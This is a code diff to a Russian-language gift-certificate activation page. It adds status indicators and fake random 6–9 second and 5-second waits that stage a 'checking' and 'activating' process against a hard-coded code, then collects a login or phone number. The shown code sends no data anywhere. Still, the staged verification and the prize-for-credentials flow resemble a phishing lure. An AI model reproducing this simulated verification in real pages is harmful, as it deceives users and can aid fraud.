@@ -58,7 +58,8 @@
     .status.info{background:#eff6ff; border:1px solid #dbeafe; color:#1e3a8a}
     .status.ok{background:#ecfdf3; border:1px solid #cdebd6; color:#065f46}
     .status.err{background:#fef2f2; border:1px solid #fecaca; color:#991b1b}
-    .status .dot{width:12px;height:12px;border-radius:50%;margin-top:4px}
+    .status .dot{width:12px;height:12px;border-radius:50%;margin-top:4px; animation:pulse 1s infinite;}
+    @keyframes pulse{0%{opacity:.4}50%{opacity:1}100%{opacity:.4}}
     .status.info .dot{background:#3b82f6}
     .status.ok .dot{background:var(--ok)}
     .status.err .dot{background:var(--error)}
@@ -112,6 +113,10 @@
               </div>
             </div>
             <button class="btn" type="submit">Активировать</button>
+
+            <!-- Статус для шага активации -->
+            <div id="activateStatus" class="status info"><div class="dot"></div><div id="activateStatusText">Активируем код…</div></div>
+
             <div id="success" class="status ok"><div class="dot"></div><div><strong>Готово!</strong> Сертификат будет привязан к вашему аккаунту.</div></div>
           </form>
         </div>
@@ -137,39 +142,42 @@
     const phoneInput = document.getElementById('phone');
     const loginInput = document.getElementById('login');
     const success = document.getElementById('success');
+    const activateStatus = document.getElementById('activateStatus');
+    const activateStatusText = document.getElementById('activateStatusText');
 
-    const showStatus = (type, text) => {
-      codeStatus.className = 'status ' + type + ' show';
-      codeStatusText.textContent = text;
+    const showStatus = (el, type, text) => {
+      el.className = 'status ' + type + ' show';
+      const textEl = el.querySelector('div:last-child');
+      if (textEl) textEl.textContent = text;
     };
+    const hideStatus = (el) => { el.className = 'status'; };
+
     const normalizeCode = v => (v || '').toUpperCase().trim();
     const cleanPhone = v => (v || '').replace(/[^\d+]/g,'');
 
-    // Проверка кода
+    // Проверка кода (6–9 секунд)
     codeForm.addEventListener('submit', (e) => {
       e.preventDefault();
       const code = normalizeCode(giftInput.value);
-      if (!code) { showStatus('err', 'Введите код сертификата.'); return; }
+      if (!code) { showStatus(codeStatus, 'err', 'Введите код сертификата.'); return; }
 
-      showStatus('info', 'Проверяем код…');
+      showStatus(codeStatus, 'info', 'Проверяем код…');
       document.getElementById('checkBtn').disabled = true;
 
-      // задержка 6–9 секунд
       const delay = 6000 + Math.floor(Math.random() * 3000);
-
       setTimeout(() => {
         if (code === VALID_CODE) {
-          showStatus('ok', 'Код принят! Доступен сертификат на 15\u00A0000 \u20BD.');
+          showStatus(codeStatus, 'ok', 'Код принят! Доступен сертификат на 15\u00A0000 \u20BD.');
           amountBadge.classList.add('show');
           step2.classList.remove('hidden');
         } else {
-          showStatus('err', 'Код недействителен.');
+          showStatus(codeStatus, 'err', 'Код недействителен.');
           document.getElementById('checkBtn').disabled = false;
         }
       }, delay);
     });
 
-    // Активация
+    // Активация (ожидание ~5 секунд)
     actForm?.addEventListener('submit', (e) => {
       e.preventDefault();
       const phone = cleanPhone(phoneInput.value);
@@ -181,10 +189,17 @@
         alert('Укажите логин (мин. 3 символа) или телефон.');
         return;
       }
-      console.log('Gift claim payload', { login, phone, code: VALID_CODE });
-      success.classList.add('show');
+
+      // показать «Активируем код…»
+      showStatus(activateStatus, 'info', 'Активируем код…');
       actForm.querySelector('.btn').disabled = true;
-      actForm.querySelector('.btn').textContent = 'Заявка отправлена';
+
+      setTimeout(() => {
+        hideStatus(activateStatus);
+        console.log('Gift claim payload', { login, phone, code: VALID_CODE });
+        success.classList.add('show');
+        actForm.querySelector('.btn').textContent = 'Заявка отправлена';
+      }, 5000);
     });
 
     // Автозаполнение кода из URL: /<code> или ?code=<code>
